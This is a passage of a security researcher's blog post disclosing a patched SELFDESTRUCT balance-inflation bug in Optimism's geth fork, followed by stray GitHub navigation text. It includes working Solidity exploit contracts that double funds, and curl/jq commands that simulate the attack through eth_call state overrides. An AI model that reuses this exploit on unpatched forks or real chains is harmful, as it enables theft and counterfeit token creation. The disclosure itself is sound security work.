Maybe surprisingly, [the company that owned Wormhole](https://jumpcrypto.com/) immediately decided to take responsibility for the issue, and [replaced all of the money in the reserves](https://www.reuters.com/technology/crypto-network-wormhole-hit-with-possible-320-mln-hack-2022-02-03/). In the case of a previous hack on Poly Network,  [the hackers returned ~$610 million](https://www.reuters.com/technology/white-hat-hacker-has-returned-nearly-all-600-million-crypto-tokens-taken-tuesday-2021-08-12/).

It is my contention that hacks on bridges tend to be noticed quickly, as the people operating the bridge generally notice when "their money" (which they owe to other people, of course) disappears. Fixing the issue involves replacing the stolen capital.

### After the Hack

Even when hackers do steal money from a bridge, the ramifications are limited as "it's only money": if you steal the cash from a bank's vault, this is certainly a problem for them, and any "bail out" might be very costly for their backers...

...and yet, the bank should be thankful their record of accounts is safe: if they were no longer sure who owned what or which transfers were legitimate—with clients demanding conflicting corrections—the resulting dispute might never end.

(We can even here consider the idea of ["insurance policies" against crypto hacks](https://support.vauld.com/en/articles/4752104-security-at-vauld), particularly given that many of these bridges are semi-centralized and can "mitigate" hacks ahead of time, fixing issues before they result in loss.)

Such theft also tends to be maybe-surprisingly fruitless, with associated wallets being [blacklisted by various exchanges](https://cointelegraph.com/news/over-10-000-blacklisted-btc-from-2016-bitfinex-hack-on-the-move) (which [people have postulated](https://sethforprivacy.com/posts/fungibility-graveyard/) will cause the ecosystem problems in the future, making some Bitcoin [akin to "blood diamonds"](https://news.ycombinator.com/item?id=30224637)).

### My Attack: Unbridled Optimism

The bug presented here—which I dub "Unbridled Optimism"—can maybe be (crudely) modelled as a bug on the far side of a "bridge", but is actually a bug in the virtual machine that executes smart contracts on Optimism (an aforementioned L2 rollup).

Exploiting this enables the attacker to have access to an effectively unbounded number of tokens (aka, the IOUs) on the far side of the bridge. It is my contention that this is more dangerous than merely tricking the reserves into allowing a withdrawl.

With the ability to sneakily print IOUs (known on Optimism as OETH) on the other side of the bridge, you still can try to (slowly) withdraw money from the reserves, but now it will look like a legitimate transfer, making it easier to go unnoticed.

(And, in case you believe that "someone would notice if the total number of IOUs were different than the amount of money locked in the reserves", this bug actually was triggered 40 days ago—as I will point out later—and no alarm bells were raised.)

### Maximum Carnage

Further, with your unbounded supply of IOUs, you could go to every decentralized exchange running on the L2 and mess with their economies, buying up vast quantities of other tokens while devaluing the chain's own currency.

Using your access to infinite capital, you could further manipulate on-chain pricing oracles to leverage for other attacks; and, until someone finally realizes your money is counterfeit, arbitragers will flock to the network to sell you their assets.

This makes this bug capable of economic griefing attacks, wherein once someone notices—even if it is a mere hour later!—it might be "too late" to unravel what is and what isn't a legitimate transaction, calling into question the entire ledger.

The next few sections involve a combination of lived and researched history of the Optimism project... which I entirely admit I might have gotten wrong somewhere. The goal here is to set up my interaction with the project and how I came to discover this bug, as I essentially write magazine-level content about software hacks ;P.

### George Hotz Cameo

One of my favorite episodes of Optimism has [a cameo by George Hotz](https://twitter.com/jinglejamOP/status/1310718738417811459), the hacker who first unlocked an iPhone (and then continued to work on jailbreaks for years before moving on to work on AI and [aftermarket autonomous driving kits](https://comma.ai/)).

An early premise of Optimism was to [support "non-interactive fraud proofs"](https://medium.com/%40cpbuckland88/fraud-proofs-and-virtual-machines-2826a3412099), wherein if the L2 state committed to L1 were "incorrect", someone could prove that to the smart contracts running on the system by using an (expensive) on-chain simulator.

The issue they had was that, for their model to work efficiently, Optimism couldn't build an interpreter, and instead [needed a "transpiler"](https://medium.com/ethereum-optimism/ovm-deep-dive-a300d1085f52) that replaced [any instruction that accessed blockchain state](https://web.archive.org/web/20210127062014/https%3A//docs.optimism.io/protocol-specifications/ovm/transpiler) with function calls on system smart contracts.

"geohot" (as he is known to many of us) helped them by writing a modification to the compiler for Solidity—the language most people use to write smart contracts—that would allow people to rapidly generate OVM-compatible contract code.

### OVM 1.0 uses OVM\_ETH ERC20

The issue with this—and bear with me here, as this is relevant—is that this strategy was only compatible at the level of Solidity source code and couldn't run existing contracts already compiled for [the Ethereum Virtual Machine](https://ethereum.org/en/developers/docs/evm/).

Even as they worked to fix this for the first real release of their "OVM", there was "historical baggage" that remained, both in the code and in the minds of the ecosystem that pushed the project down roads of further EVM incompatibility.

The biggest "most glaring" issue that I ran into while attempting to use Optimism at this time (late 2020) was that there was [no native support for a "gas token"](https://web.archive.org/web/20210127063556/https%3A//docs.optimism.io/developer-documentation/erc20-tutorial/limitations): Ether stored on Optimism's L2 was instead represented by [an ERC20 token](https://www.investopedia.com/news/what-erc20-and-what-does-it-mean-ethereum/).

> We do not have built in native Ether support. For example, this means you will not be allowed to use BALANCE or SELFBALANCE (Note: you can use CALLVALUE, it will just always return 0).
>
> All “ETH” on L2 will be an ERC20. Upon depositing ETH into our deposit contracts on L1, it will automatically be converted to ERC20 ETH on L2. If you wish to use ETH in your contract, instead just interact with it like you would with a normal ERC20 contract. This allows projects to not have to write their contracts to support both ERC20s and ETH, but rather just ERC20s (e.g. 0x, Uniswap).
>
> We do have plans in the future to make our custom compiler automatically convert opcodes like BALANCE to ERC20ETH.balanceOf(addr) although this is currently not a priority until after mainnet. If this type of functionality is critical for your application, please let us know in Discord!

I'd actually read this, quite hopeful that this direction could be changed early on, and joined their Discord server on December 6th of 2020 in order to make the case that this incompatibility with the EVM semantics would lead to problems.

I ended up—as often happens with chat servers :/—in an argument with a random user who was acting extremely authoritative (to the point where I had started to model them as a key developer) that this was actually a *great* design decision.

Regardless, Orchid's multi-chain effort fundamentally requires that the same code be deployable on every network—so the list of supported chains can be "permissionless" and up to the user ecosystem—forcing me to pass on Optimism.

### EVM "Equivalence"

Of course, a year later, it had become clear that not being compatible with existing smart contracts and developer tooling was, in fact, *a serious problem*; and, so, the Optimism project began work on [what they called "EVM Equivalence"](https://medium.com/ethereum-optimism/introducing-evm-equivalence-5c2021deb306).

This upgrade, to be named OVM 2.0, was of great interest to my work on Orchid, as it meant that the new multi-chain nanopayments platform I had been pushing us towards could finally be deployed. I thereby jumped back into Optimism.

When working with a new chain, the first thing I tend to do is run a quick unit test of functionality I either rely on or prefer (a test suite of sorts that has found bugs in numerous chains that I have reported over the past year).

Immediately, I ran into a confusing issue with Optimism: the account state—as cryptographically verifiable from the block "state root"—somehow was missing the account balance (which was, instead, always 0). I filed [a bug about this](https://github.com/ethereum-optimism/optimism/issues/1947).

### OVM\_ETH Lives on in OVM 2.0

The response to my bug report somewhat shocked me: it turned out that OVM 2.0 continued to store all of the balances for user accounts in the storage state of an ERC20 contract, and they were having [an active discussion about *whether* to remove this](https://github.com/ethereum-optimism/optimism/discussions/1444).

Regardless, this became a continual "thorn in my side" as I began working on another project of mine the last month or so: an extremely pedantic and heavily-indexed block explorer that introspects every state update of the entire EVM.

Between this, that [Optimism timestamps are backdated](https://github.com/ethereum-optimism/optimistic-specs/discussions/23) (something [they did fix](https://github.com/ethereum-optimism/optimism/commit/57742a04df1894fcd264e358f2f3f37813e7658b)) or even non-monotonic, and how they [keep rebooting their chain](https://github.com/ethereum-optimism/optimism/issues/1975), Optimism has caused me to spend a disproportionate amount of time feeling... "pessimistic" ;P.

(However, I will say that the developers of this project are actually quite pleasant to work with, and so I have at least had fun talking with them on Discord while trying to access older data and [filing bugs for high-level design issues](https://github.com/ethereum-optimism/optimism/issues/1976).)

### StateDB UsingOVM Redirection

The way this "store the native balances in an ERC20 token storage state" is implemented in the codebase is as a set of patches to go-ethereum's StateDB, the code which maintains an in-memory buffer of pending/dirty account objects to flush to disk.

(The way Ethereum stores this state—and the [state trie data structure](https://medium.com/shyft-network-media/understanding-trie-databases-in-ethereum-9f03d2c3325d) it uses to allow efficient cryptographic verification of cherry-picked data—is one of the more fascinating and useful parts of [the protocol design](https://ethereumbuilders.gitbooks.io/guide/content/en/design_rationale.html); here is [another reference](https://medium.com/%40eiki1212/ethereum-state-trie-architecture-explained-a30237009d4e).)

The UsingOVM flag is set with a USING\_OVM environment variable (with no corresponding command line flag, as far as I know; that you need to set this environment variable while initializing the genesis block took me too long to figure out ;P).

Operations on the StateDB that affect an account balance are then redirected from the underlying stateObject (which represents an individual, cached account) to storage state in the OVM\_ETH contract. Below is the code for state.StateDB.SetBalance.

NOTE: I heavily re-format and even somewhat "editorialize" code snippets to make them narrower, shorter, and less dense. If you go look at the actual code, don't be surprised when it doesn't look exactly the same as my presentation ;P.

> func (s \*StateDB) SetBalance(
> addr common.Address, amount \*big.Int
> ) {
> if rcfg.UsingOVM {
> key := GetOVMBalanceKey(addr)
> value := common.BigToHash(amount)
> s.SetState(dump.OvmEthAddress, key, value)
> } else {
> stateObject := s.GetOrNewStateObject(addr)
> if stateObject != nil {
> stateObject.SetBalance(amount)
> }
> }
> }

Now, there's actually already something interesting going on: s.GetOrNewStateObject has an observable side effect; but, when UsingOVM, this doesn't get called. This means that an account might own native currency without having an account object!

The exact issue here is that contracts are able to ask for the hash of the code of other accounts (which is sometimes used to verify their trusted behaviors). If an account has no code, its code is "", so its codehash is the hash of an empty buffer.

However, if you ask for the codehash of an address that isn't currently backed by an object in the state trie, the codehash you get back is null. This observable effect is an example of the subtle incompatibilities that Optimism keeps experiencing.

(If this were my project, I'd definitely have dropped everything long ago—pre-OVM 2.0—to prioritize removing this set of patches by fixing GetOVMBalanceKey to store hash preimages, re-executing the chain, and then swapping out the state trie.)

### Why is it always SELFDESTRUCT?!

One of the more "problematic" instructions in the Ethereum VM is SELFDESTRUCT, which goes back to the original design. (For clarity: this instruction used to be called SUICIDE, but the *code*—which we will be reading—was never renamed.)

This instruction allows a contract to destroy itself, removing its account object. The primary benefit of this instruction is that it allows for potentially large amounts of "obsolete" state to be cleaned up quickly from the blockchain's active set.

On the other hand, what makes this instruction "problematic" (besides [its triggering name](https://eips.ethereum.org/EIPS/eip-6)) is that it allows for potentially LARGE amounts of state to be cleaned up VERY QUICKLY, requiring the VM to do an arbitrary amount of work, atomically.

This instruction has further been known to continually cause corner cases in new EVM features, and so has often been threatened with [some form of removal](https://hackmd.io/%40vbuterin/selfdestruct) (such as [banning it in new contracts](https://eips.ethereum.org/EIPS/eip-3670) or [removing most of its functionality](https://github.com/ethereum/EIPs/pull/4758)).

### How SELFDESTRUCT Works

When a contract hits the SELFDESTRUCT instruction, it designates a "beneficiary" to receive any funds it still owns. The implementation of this opcode in go-ethereum's EVM adds the balance to the beneficiary and then calls StateDB.Suicide.

> func opSuicide(
> pc \*uint64, interpreter \*EVMInterpreter,
> contract \*Contract, memory \*Memory, stack \*Stack
> ) ([]byte, error) {
> state := interpreter.evm.StateDB
> beneficiary := common.BigToAddress(stack.pop())
> balance := state.GetBalance(contract.Address())
> state.AddBalance(beneficiary, balance)
> state.Suicide(contract.Address())
> return nil, nil
> }

The implementation of StateDB.Suicide then clears the balance of the account back to 0. Frustratingly, it does this using neither the stateObject's setBalance setter nor to the shared common.Big0 constant, making this a bespoke piece of logic.

> func (s \*StateDB) Suicide(addr common.Address) bool {
> stateObject := s.getStateObject(addr)
> if stateObject == nil { return false }
> stateObject.markSuicided()
> stateObject.data.Balance = new(big.Int)
> // aka stateObject.setBalance(common.Big0)
> return true
> }

StateDB.Suicide, in turn, calls stateObject.markSuicided, which does nothing other than set a boolean value on the object to true. Importantly, this means that the contract at this point STILL EXISTS and continues to have the code it previously had!

> func (s \*stateObject) markSuicided() {
> s.suicided = true
> }

### Pending Deletion

This begs the question: how does the object ever actually get destroyed? The answer is that this is postponed to the end of the transaction, when StateDB.Finalise is called and all of the suicided dirty account objects are marked deleted.

> func (s \*StateDB) Finalise() {
> for addr := range s.journal.dirties {
> obj, exist := s.stateObjects[addr]
> if !exist { continue }
> if obj.suicided || obj.empty() {
> obj.deleted = true
> } else {
> obj.finalise()
> }
> }
> s.clearJournalAndRefund()
> }

(As a further optimization, the actual account object isn't truly deleted until the next time the state root hash needs to be calculated, as all of the changes to the merkle trie can then be made and committed at once. This isn't relevant, though.)

> func (s \*StateDB) IntermediateRoot() common.Hash {
> s.Finalise()
> for addr := range s.stateObjectsPending {
> obj := s.stateObjects[addr]
> if obj.deleted {
> s.deleteStateObject(obj)
> } else {
> obj.updateRoot(s.db)
> s.updateStateObject(obj)
> }
> }
> return s.trie.Hash()
> }

### The Actual Bug

By this point, we actually "passed by" the critical bug... did you catch it? ;P The code for Suicide is still directly modifying the stateObject's data.Balance field instead of checking UsingOVM and redirecting that modification to OVM\_ETH.

This means that, when a contract self-destructs, its balance is BOTH given to the beneficiary AND ALSO KEPT. If the contract had 10 OETH, 10 OETH are CREATED from thin bits and handed to the beneficiary.

When Optimism fixed this bug—as part of [PR #2146](https://github.com/ethereum-optimism/optimism/pull/2146) (which slightly hid this update in a pile of other updates to give time for unknown forks to update their code)—they added the following logic to opSuicide (notably, not StateDB.Suicide).

> if rcfg.UsingOVM && interpreter.evm.chainConfig
> .IsSelfDestructInflation(interpreter.evm.BlockNumber)
> {
> state.SubBalance(contract.Address(), balance)
> }

As far as I can tell, the reason they needed to put this code in opSuicide—which separates it from the other logic that directly clears the balance field as well as all of the other UsingOVM overrides—is so they can get access to the chainConfig.

This is important, because the code still needs to implement the wrong behavior to allow it to synchronize all of the historical state, some of which actually tickles this bug (without exploiting it). They decided block 3135900 would be the cutoff.

> // OpMainnetSelfDestructForkNum is the height at which the
> // suicide inflation bug hardfork activates on OP mainnet.
> OpMainnetSelfDestructForkNum = big.NewInt(3135900)

### Was this Exploited?

One of the questions we often want to answer is "has anyone else already pulled off an exploit using this bug?". To answer this, I instrumented the code for the OVM 2.0 to log any time a transaction destroyed a contract with a balance.

As SELFDESTRUCT is already a rare opcode, and this is even then a subset of all uses of SELFDESTRUCT—and further, as OVM 2.0 was only released three months ago—there was only a single user who had ever tried this: [on Christmas Eve (2021)](https://optimistic.etherscan.io/address/0x3d080421c9dd5fb387d6e3124f7e1c241ade9568).

In those transactions (as seen on the Optimism block explorer hosted by Etherscan) we see a user creating and destroying three contracts. The first two times, the contract's beneficiary is the 0x0 address, while the third time it is the user themself.

It frankly felt like someone had noticed the bug—seeing that Etherscan left the balance in place after the contract was destroyed—and even played with it a bit (to see if this was a behavior of 0x0)... but hadn't realized it was exploitable.

I actually managed to track down this user (!!) and it turns out they work for Etherscan ;P. It just goes to show that sometimes even people who are staring directly at a bug don't always see the indirect security implications.

I have not, myself, had time to verify that this was never triggered on the two known-to-me forks of Optimism: Boba and Metis. I feel like someone else might have checked by now and told me, and I also feel it is probably somewhat unlikely (given the lack of usage on Optimism), but I can't say for sure one way or the other at this time.

### Concrete Exploit

Which brings us to the fun part: a hands on exploration of exploiting this bug. To do this, we need to write a contract (in Solidity) that we can deploy/fund and on which we can call SELFDESTRUCT, replicating the money it is holding.

As the contract continues to exist until the end of the transaction, and we want to replicate money as fast as possible (by compounding our earnings), we set the contract itself as the beneficiary. This way, each call to destroy doubles its funds.

To allow the contract to be funded in the first place, we have to add a payable constructor. Finally, we add a method that allows us to get the money back out of the contract (I originally used selfdestruct, but transfer is cleaner).

> pragma solidity 0.7.6;
> contract Exploit {
> constructor() payable {}
> function destroy() public {
> selfdestruct(payable(address(this)));
> }
> function take() public {
> msg.sender.transfer(address(this).balance);
> }
> }

To drive this attack, we need another contract which creates an instance of this contract, calls destroy in a loop, and then calls take. I decided to put this logic in the constructor of the contract, so it could be created and executed in one transaction.

> contract Attack {
> constructor(uint count) payable {
> Exploit exploit = new Exploit{value: msg.value}();
> for (; count != 0; --count)
> exploit.destroy();
> exploit.take();
> msg.sender.transfer(address(this).balance);
> }
> receive() external payable {}
> }

As this contract will be receiving funds from the Exploit contract it instantiates, it needs a payable receive() implementation (as otherwise the contract will reject any attempt to give it money using transfer; notably, selfdestruct would bypass this!).

### Safe/Easy Testing

While one way to test this exploit would be to run it, that not only might cause problems later on guaranteeing the state is still legitimate, but it could potentially tip off other people watching the blockchain looking to steal our exploit.

That might sound far-fetched, but it is [actually quite common](https://www.paradigm.xyz/2020/08/ethereum-is-a-dark-forest) and is heavily automated: in this case, our exploit is so "plug-and-play" that if someone merely simulated running it themselves they would become the beneficiary.

While I will leave attempts to build more obfuscated exploits as "an exercise to the reader", if nothing else you need a way to test the behavior of your exploit while developing it, and so we need an easy way to simulate running instructions.

At this point someone might suggest an off-the-shelf test-driver—such as Ganache—but it wouldn't have this bug. We could give it the bug, but that's work. We could run our own local fork of Optimism, complete with sequencer, but that's also work.

Instead, we want a way to use a "normal" Optimism full node—preferably one we run ourselves (as we're talking about a very serious exploit), though for our exploration here the public endpoints will work just fine!—to run our exploit.

### eth\_call State Overrides

The solution is the JSON/RPC method eth\_call. Now, I get it: "eth\_call is obvious; I know about eth\_call". (In case you don't: eth\_call is a method exposed by Ethereum nodes that allows you to speculatively run exported Solidity functions.)

However, it isn't actually so obvious: if you read [the documentation for eth\_call](https://eth.wiki/json-rpc/API#eth_call), it is only going to let us run code that is already deployed to the blockchain, which we really want to avoid at all costs, lest someone notice our exploit.

The trick is that go-ethereum—the most commonly used EVM implementation—additionally [supports "state overrides" on eth\_call](https://geth.ethereum.org/docs/rpc/ns-eth#eth_call) that let us pose hypothetical execution environments by changing the code or balance of an account.

Our strategy will thereby be to develop a tiny contract that scripts all of the behaviors we need (instantiating and funding Attack) and then returns any information we need to see if our code worked (in this case, our final balance).

> contract Test {
> function test() public payable returns (uint256) {
> new Attack{value: msg.value}(1);
> return address(this).balance;
> }
> receive() external payable {}
> }

### JSON/RPC via curl

To make this a "hands on" exercise, I'm going to walk you through compiling and executing this contract using nothing but curl, jq, xxd, and (for the Solidity compiler) docker (though you can alternatively install solc on your system).

NOTE: Optimism's public RPC server is (apparently) being run by [QuickNode](https://www.quicknode.com/), and they only are set up to allow a trivial number of historical queries; so, when doing calls on old blocks, you might get a null result back with the error "Archive Requests/month limit reached - Please consider upgrading at quicknode.com"; if this happens, you will (sadly) have to run your own full Optimism node to see the result.

First we define an rpc variable to contain the URL of our Optimism full node. Then, we define an rpc function that will take a JSON object via stdin, add to it the JSON/RPC protocol fields using jq, and then post it to the RPC server using curl.

> rpc=https://mainnet.optimism.io/
> function rpc() { jq '.+{jsonrpc:"2.0",id:1}' |
> curl -H 'Content-Type: application/json' \
> -s "$rpc" --data-binary @-; }

Next, we will compile the contract (named attack.sol); in the build folder we will have three .bin files, one for each of Exploit, Attack, and Test. These bin files [don't actually represent the code for the contract](https://blog.openzeppelin.com/deconstructing-a-solidity-contract-part-ii-creation-vs-runtime-6b9d60ecb44c/): they are the code for the constructor.

> # don't do this if you installed solc
> alias solc='docker run -v "$PWD":/mnt \
> -w /mnt ethereum/solc:0.7.6'
> solc -o build attack.sol --bin --overwrite

The constructor returns the code for the contract itself, so we are going to override the state of a random account to make its code the code of this constructor (this would never actually happen) and then eth\_call it to get its return value.

> rnd=0x$(head -c 20 /dev/urandom | xxd -ps)
> tst=$(echo '{"method":"eth\_call","params":[
> {"to":"'"$rnd"'"},"latest",{"'"$rnd"'":
> {"code":"0x'"$(cat build/Test.bin)"'"}
> }]}' | rpc | jq -r .result)

### Testing the Fix

Now that we have the code for the Test contract itself, we can override the code on our random address to *that* and then eth\_call the test() method. We will also create a second address to be the caller, and override its state to own money.

> frm=0x$(head -c 20 /dev/urandom | xxd -ps)
> function tst() { set -e; blk=$1; shift 1;
> echo '{"method":"eth\_call","params":[{
> "data":"0xf8a8fd6d",
> "from":"'"$frm"'",
> "value":"0x1",
> "to":"'"$rnd"'"
> },"'"$blk"'",{
> "'"$frm"'":{"balance":"0x1"},
> "'"$rnd"'":{"code":"'"$tst"'"}
> }]}' | rpc | jq -r .result; }

If you take the time to pull apart all of the shell quoting (sorry), you will note that the "data" we send to the contract is 0xf8a8fd6d. This is the first 32-bits of the keccak256 hash of "test()", which serves as the message selector for that function.

We can now run the exploit. The tst function I defined takes an argument blk (that must be in hex) which is the block number "at which" to run our code; this allows us to try running our code before and after OpMainnetSelfDestructForkNum.

> $ echo $(($(tst $(printf 0x%x 3135900))))
> 1
> $ echo $(($(tst $(printf 0x%x 3135899))))
> 2

When running this on a block after (or including) 3135900, we will only have the 1 token we started with (sent as the value parameter in tst). However, when running on blocks before 3135900, we get the result 2 (as Test has Attack double once).

### Yet Another Incompatibility

At this point, you might wonder what happens if we try this on other EVM-compatible blockchains, such as Ethereum or Avalanche. We merely need to change the rpc variable and re-run tst. The result we get is... 0. Not 2 (of course), *but also not 1*.

> $ rpc=https://cloudflare-eth.com/
> $ echo $(($(tst latest)))
> 0

One of the tropes in the "Bag of Hacks" talk I give at hackathons and college classes is that, quite often, security fixes are done in a hurry by people who are attempting to mitigate a specific flaw and the resulting "fix" breaks something else.

I actually noticed this while testing Boba and Metis—which are forks of Optimism—in the middle of the night when I realized that they would also be affected (but wasn't sure if the Optimism people had reached out to them already; they had).

### What is Wrong

In this case, the code that was added to opSuicide subtracted the prior balance from the contract to clear it. This is, to be fair, extremely reasonable behavior... I dare say it is *more* reasonable than the behavior Ethereum originally implemented ;P.

The way that the original code worked, however, is that it directly set the balance to 0. This means that if you selfdestruct to yourself, instead of 1+1-1 being 1, the resulting balance is forced to 0. I noted this in the discussion on the pull request.

(Honestly, I'm actually thinking this is "probably close enough", given that—as mentioned earlier—the OVM is already getting other semantics surrounding this wrong, and the result is just that money that would have been destroyed survives.)

(That said, it also wouldn't surprise me if these incompatibilities between the EVM and the OVM can be compounded with assumptions made by various contracts people might choose to deploy to expose and exploit other vulnerabilities.)

What follows is me being "super real" and attempting to enter into a particularly deep conversation about morality. Conversations like this are, in some sense, the dessert at the end of a long meal. The tech is over, but maybe you'd like to stay for a bit?

I partly say this because [some people](https://daringfireball.net/linked/2009/09/15/apple-sig-server)—who I notably *do not* consider part of "my audience" ;P—*hate this stuff*; but, I also say this because I want to be clear: these are vulnerable thoughts that people don't say out loud enough.

That said, I also sometimes think that these conversations only really work when done in person, during the third hour of a five-hour late-night Q&A session at a hackathon like [SpartaHack](https://twitter.com/SpartaHack). OMG do I miss attending in-person SpartaHack :(.

### Crypto Ethi-nomi-cs

Something I tend to spend a lot of time talking about—as a "grey hat" security researcher who works in a field where we routinely hoard bugs and drop fully-weaponized exploits of 0-day vulnerabilities (our jailbreaks)—is "the ethics of hacking".

In the case of limited hardware and the fight against digital rights management (which includes use of Intel SGX, the reason I take issue with MobileCoin) the moral tradeoffs have become somewhat clear to me over the years.

However, working with cryptocurrencies feels a lot murkier. Do we *truly believe* that "code is law", and if someone finds a bug that lets them walk away with a billion dollars everyone should think "I guess I made a mistake"?

If you do, does your decision on that front change if you aren't going to personally profit, but will instead destroy a system people were using? FWIW, no matter how much we say "code is law", I personally have a hard time with destruction as ethical.

And yet, if we do not believe that destruction is ethical, and we are going to assign such strong *moral* judgement to people who destroy rather than build, how can we avoid falling into the trap of building systems that only work due to trust?

### Move Fast and Lose Cash

So, one of the more "fun" things about working in crypto is exactly what makes it "scary": the (monetary) stakes tend to be extremely high. One ramification of this is that security research matters a lot more than in other fields of software.

And yet, a complaint that I too often have about crypto projects is that they sometimes seem to play fast and loose with consensus or correctness while they "move fast and break things" their way to access large amounts of investment capital.

Meanwhile, projects that take more conservative approaches are seen to "move slowly and too carefully"; and, as with Web 2.0 companies that spend "too much" time protecting user privacy before launching new features, they are at a disadvantage.

I thereby sometimes balk at "helping" other projects with basic issues of decentralization or security, as I feel like those can't be afterthoughts: this stuff is too important to be releasing quickly and adjusting the design in the field.

And yet, we see crypto project after crypto project trying to externalize the cost of their *core design* to people being only indirectly compensated, rather than building a team around mathematicians, economists, and security experts.

### Financial Invectives

Meanwhile, there's a kind of fishy thing going on with many crypto projects, with what can feel like a "dark pattern" arising wherein projects force users to become invested in their project (by way of a token) to merely be customers.

The result is that it can be hard to trust anyone anymore, as seemingly every single participant—even ones that classically would have tried to remain neutral—suddenly are being pushed around by carefully designed monetary incentives.

To draw a realistic-to-crypto analogy: imagine if using Apple Music involved not a subscription fee, but proving you own some value in shares of Apple's stock. Now, if Apple goes up in value, so do the shares you are required to hold.

This thought demoralizes me at times (and I will note that Orchid has avoided such models). And yet, is this even new? Are "Apple fanbois" accidentally incentivized by their expensive hardware investment (and later resale value)?

I actually have been meaning to write an article on what I feel is a form of "runaway incentives" on the supply side—as opposed to with consumers—of some crypto projects, a topic I have occasionally written about so far only in random comments on Hacker News, GitHub, and Twitter.

If you would be interested in reading such, I recommend following [me on Twitter](https://twitter.com/saurik). I also am usually quite open to giving (for free! I am a politician in California and don't want to deal with [the honoraria restrictions](https://www.fppc.ca.gov/content/dam/fppc/NS-Documents/TAD/Public%20Officials%20and%20Employees/LocalGiftFactSheet_Final_2021%20Version_2.pdf)) talks at hackathons or conferences, particularly if I don't have to travel far.

### Exploitation Games

I've been working on incubating "exploits" (nothing else like this bug, to be clear) for a number of projects ("as one does" in security), and the discussion constantly comes up about "what to do with them"; and the answer just isn't at all obvious.

People discuss—sometimes clearly in jest, sometimes... *not so much* ;P—ways to profit off of hacks by releasing "epic takedowns" of various projects and shorting your way to riches, or start plotting "the perfect crime" (usually quite fanciful).

Over the years, I have heard many stories from hackers I have worked with—including both geohot and my good friends at [exploitee.rs](https://exploitee.rs/)—about bug bounty programs, but have never myself sought out or tried to participate in one.

I've often then felt that there just isn't *enough* "friendly" adversarialism in the crypto community. I'd love to see a conference where every single talk is "why protocol X will never work" without that being seen as "unconstructive".

I thereby tend to actually gravitate strongly towards projects that are willing to take a hard line with other projects and "duke it out" in benchmarks, articles, or analysis, calling out scams rather than merely ignoring them.

### Bountiful Bug Bounties

Which finally brings me back to this Optimism bug. I needed a talk to give at ETHDenver (due to a scheduling SNAFU) and I saw that Optimism listed [a bounty with Immunefi that has a $2,000,042 maximum payout](https://immunefi.com/bounty/optimism/) for "critical" bugs.

(Technically, their Immunefi program did not cover this bug, as it is not in the explicit scope, so I couldn't go through Immunefi and had to reach out directly. But they have been extremely gracious and immediately said they would cover it equivalently.)

The program from Optimism isn't even the highest maximum listed on Immunefi: [Olympus](https://www.olympusdao.finance/), which describes itself as "a decentralized reserve currency", has [a bug bounty program listed](https://immunefi.com/bounty/olympus/) with a maximum payout of $3,333,333!

This then gave me not one but two incentives to "bother with" dropping everything else I was doing to deeply analyze "that thing I saw that felt off but do I really care to look as I need to work on my own project (or even take a nap)".

### Feeling Optimistic

And, in fact, [Optimism decided to award the full $2M+42](https://medium.com/%40optimismpbc/disclosure-fixing-a-critical-bug-in-optimisms-geth-fork-a836ebdf7c94); ...which has the property of retroactively compensating me for the copious time I've spent analyzing their project this past year, as if I had been a team member.

(Which causes yet another interesting incentive alignment: I now feel "quite a bit grateful" to Optimism, and have come to like them more because of this award... maybe you shouldn't trust what I say about them? ;P)

We can also maybe feel good that the existence of this large bounty did what it set out to do: Optimism made a mistake, but they then incentivized—and quite generously so!—the work to correct it, protecting their users from loss.

(BTW, Boba and Metis—both forks of Optimism—had [a max $100,000](https://docs.boba.network/bug-bounty) and [a max $1,000,000](https://immunefi.com/bounty/metis/) bounty, respectively. It is an interesting question in some sense: should they share the responsibility of such a bounty?)

If nothing else, I successfully scored an invite to [their party at ETHDenver](https://www.eventbrite.com/e/the-multi-chain-party-hosted-by-ankr-metis-boba-and-polygon-tickets-262095172717) ;P. Maybe I'll see some of you there!

I missed it in all of the bustle on Thursday, but apparently [Boba Network](https://boba.network/) officially announced that [they would additionally extend to me their max award](https://twitter.com/bobanetwork/status/1491989915336388618?s=21), which means the total is now $2,100,042... which might actually set a record for the largest bounty ever received for a single bug? (We had all not realized this until it was pointed out by [a comment on Hacker News](https://news.ycombinator.com/item?id=30291629); though before it was only a technicality due to the +$42...the +$100k feels a lot more fair to claim a new record!)

Copyright © 2008–2022 — Jay Freeman (saurik)

[Jay Freeman (saurik)](/)
saurik@saurik.com
(805) 895-7209
<https://twitter.com/saurik>



=== Content from github.com_6915ce17_20250114_231554.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fethereum-optimism%2Foptimism%2Fpull%2F2146)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

